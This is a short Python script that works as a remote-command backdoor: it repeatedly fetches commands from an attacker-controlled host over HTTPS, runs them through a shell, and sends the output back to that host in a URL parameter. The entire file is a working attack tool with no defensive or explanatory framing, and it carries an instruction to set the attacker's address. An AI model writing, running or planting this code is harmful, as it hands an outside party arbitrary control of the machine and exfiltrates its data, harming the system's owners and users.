import requests
import subprocess
import time
import urllib.parse

ATTACKER_IP = 'chat.fjh1997.top' # change this to the attacker's IP address
ATTACKER_PORT = 443

while True:
    command = requests.get(f"https://{ATTACKER_IP}:{ATTACKER_PORT}/get").text
    if command == '':
        continue
    CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    requests.get(f"https://{ATTACKER_IP}:{ATTACKER_PORT}/result?res={urllib.parse.quote(CMD.stdout.read()+CMD.stderr.read())}")
